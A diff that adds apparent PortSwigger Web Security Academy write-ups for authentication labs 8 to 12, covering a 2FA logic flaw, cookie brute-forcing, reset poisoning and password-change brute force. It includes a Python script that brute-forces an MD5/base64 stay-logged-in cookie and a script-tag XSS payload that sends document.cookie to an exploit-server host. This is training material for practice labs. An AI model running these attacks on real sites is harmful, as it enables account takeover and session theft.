@@ -151,6 +151,155 @@ for pwd in lines:
 5) We will receieve 302 error for carlos so try login using id and pass and lab should be solved.
 
 
+									AUTH -LAB08:
+								      2FA broken logic
+								      
+ This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.
+
+    Your credentials: wiener:peter
+    Victim's username: carlos
+
+You also have access to the email server to receive your 2FA verification code. 
+
+Solution:
+
+1) First we need to login using wiener and peter userid and password and click on email client to have access to the 2FA code and than enter the code in the 2FA.
+2) We need to send 3 requests to the repeater 2 POST and 1 GET request.
+3) First request is of POST/login, next GET/login2, and POST/login2.
+4) First request is when we enter correct userid and password, next is of when we get the request for the 2FA, and next is of 2FA code.
+5) we find no vulnerability in the first request, in second request we have 2 vulnerability it takes verify name where we can put target name carlos without getting any error and we can remove session cookie this is second vulnerability, in third request we can change the verify name and get no error.
+6) We need to send third request to the intruder, clear all and than $Add to the 2FA four digit number, keep attack as sniper and payload as bruteforce and remove alphabets and keep 0-9 numbers. thier should be 10000 count and start attack.
+7) Where we get different response then 200 is the 2FA code for carlos.
+
+***********************************************
+
+									
+									AUTH -LAB09:
+								Brute-forcing a stay-logged-in cookie
+								
+ This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.
+
+To solve the lab, brute-force Carlos's cookie to gain access to his "My account" page.
+
+    Your credentials: wiener:peter
+    Victim's username: carlos
+    Candidate passwords
+
+Solution:
+
+1) First we need to connect to the foxyproxy and connect to the firefox and burpsuite.
+2) we need to login using the given username and password and click the option stay-logged in option.
+3) For stay-logged in function a new cookie key is generated which is in hash MD5 format and after decoding it is in the username and password format i.e. wiener:peter
+4) Then we need to send the my-account/GET request to the intruder and $Add the cookie of stay-logged in.
+5) Use the SNIPER attack and for payload use simple list and paste the given passwords.
+6) In the payload processing a) add hash:md5 b)add prefix:carlos: c)encode: base-64 encode and start the attack.
+7) we will find the different 200 status and that is the output, but for me I was not receiving 200, so I used the pythin script.
+
+PYTHON SCRIPT: 
+
+import requests
+import sys
+import urllib3
+import hashlib
+import base64
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}
+
+def access_carlos_account(url):
+
+    print("(+) Brute-forcing Carlos's password...")
+    with open('password.txt', 'r') as file:
+        for pwd in file:
+            hashed_pwd = 'carlos:' + hashlib.md5(pwd.rstrip('\r\n').encode('utf-8')).hexdigest()
+            encoded_pwd = base64.b64encode(bytes(hashed_pwd, 'utf-8'))
+            str_pwd = encoded_pwd.decode('utf-8')
+
+            r = requests.Session()
+            myaccount_url = url + '/my-account'
+            cookies = {'stay-logged-in': str_pwd}
+            req = r.get(myaccount_url, cookies=cookies, verify = False, proxies=proxies)
+            if 'log out' in req.text:
+                print('(+) Carlos password is' + pwd)
+                sys.exit(-1)
+        print('(-) could not find carlos password.')
+
+def main():
+    if len(sys.argv) != 2:
+        print('(+) Usage %s <url>' % sys.argv[0])
+        print('(+) Example: %s www.example.com' % sys.argv[0])
+        sys.exit(-1)
+
+    url = sys.argv[1]
+    access_carlos_account(url)
+
+
+if __name__ == '__main__':
+    main()
+    
+
+In the terminal write python3 filename and copy site url and remove / from the end and run.
+
+
+**********************************************************
+
+									AUTH -LAB010:
+								  Offline password cracking
+								  
+ This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.
+
+    Your credentials: wiener:peter
+    Victim's username: carlos
+
+Solution:
+
+1) First we need to login using given username and password and inspect the query in the burpsuite.
+2) We can find that it doesn't have any http only flag so we can breach it using the javascript.
+3) now we need to find where we can update anything in the site and their is one post function where we can post the javascript query.
+4) To test we can post one query <script>alert(1)</script>.
+5) Now the above query executes now we can do javascript hack.
+6) Query: <script>document.location='https://exploit-0a2b00bf0427f98580877a39016b006b.exploit-server.net/exploit'+document.cookie</script>.
+7) above query is used to get the logged-in cookie for the user.
+8) Go to the exploit tab at the top of the site and go to the access log session to get access to the "GET /exploitsecret message and try this in decoder and crackstation.
+9) Then delete the user and the lab is solved.
+
+*********************************************************
+									
+									AUTH -LAB011:
+							   Password reset poisoning via middleware
+
+This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server. 
+
+Solution:
+
+1) First we need to go to the my-account section and click on forgot password to see what is the vulnerability and enter given account name wiener.
+2) Send this request to repeater and then open exploit and go to email-client and send the request to repeater.
+3) Reset the password and send the request to repeater.
+4) First request is post fogot password, Second is get forgot password, Third is post forgot password which we change the password.
+5) Now we need to try the vulnerabilities, in first request we need to find that it is vulnerable to header or not by using X-Forwaded-Host: (exploit server link without http and till net) and hit send and then check the email client and see if we got mail from exploit server and change the name to carlos in the request.
+6) Then go to exploit server access log and look to carlos entry with different ip address and copy the password token and copy it and paste it into temp forgot password cookie in second request.
+7) In third request paste the cookie in the both cookie link and change the password in the passowrd field at the bottom and hit send and follow redirection and try login using new password.
+								
+*******************************************************
+
+									AUTH -LAB012:
+								Password brute-force via password change
+								
+ This lab's password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos's account and access his "My account" page.
+
+    Your credentials: wiener:peter
+    Victim's username: carlos
+    Candidate passwords
+
+
+Solution:
+
+1) First login using the given username and password and then try to find the vulnerablity in the password change section.
+2) Here we find the vulnerability is that when we enter the new password and enter retype new password different and when the original passowrd is correct we get --> new passwords do not match and when password is incorrect we get passowrd is incorrect message.
+3) So we need to change the last request when we enter wrong password to repeater and then to the intruder and change username to carlos and add the password given as simple list.
+4) In the intruder result when we get different length we get correct password try login with that username and password.
+
 								
 
 
